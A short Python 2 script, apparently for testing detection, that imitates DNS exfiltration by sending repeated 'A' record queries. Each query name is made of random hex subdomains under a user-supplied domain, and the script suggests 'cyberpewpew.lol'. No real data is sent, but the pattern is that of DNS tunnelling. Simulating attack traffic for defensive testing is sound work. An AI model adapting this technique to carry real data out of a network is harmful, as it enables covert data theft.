#!/usr/bin/env python

# Script to replicate Threat Injection: DNS 'A' record data exfiltration
import sys
import dns.resolver
import os,binascii
from time import sleep

# Check arguments are given
if not len(sys.argv) == 3:
    print "Usage:\t%s <#_of_requests> <domain>" %sys.argv[0]
    print "\tI suggest '100' and 'cyberpewpew.lol'"
    exit()
else:
    num = sys.argv[1]
    domain = sys.argv[2]

# Create new dns resolveer instance
resolver = dns.resolver.Resolver()
# All requested domains are bogus so don't wait around
resolver.timeout = .5
resolver.lifetime = .5

# Make 100 DNS 'A' record requests
for d in range(0, int(num)):
    rdomain = str()
    # Create two 16 byte hex subdomains
    sd1 = binascii.b2a_hex(os.urandom(16)) + '.'
    sd2 = binascii.b2a_hex(os.urandom(16)) + '.'
    # Prepend subdomains 1 & 2 to the domain
    rdomain = sd1 + sd2 + domain
    # Make DNS 'A' record request
    try:
        print 'attempt #:  %d' %d
        print 'To: %s' %rdomain
        ans = resolver.query(rdomain, "A")
        # Wait one second to mimic real requests timing
        sleep(.5)
    except Exception as e: 
        print str(e)
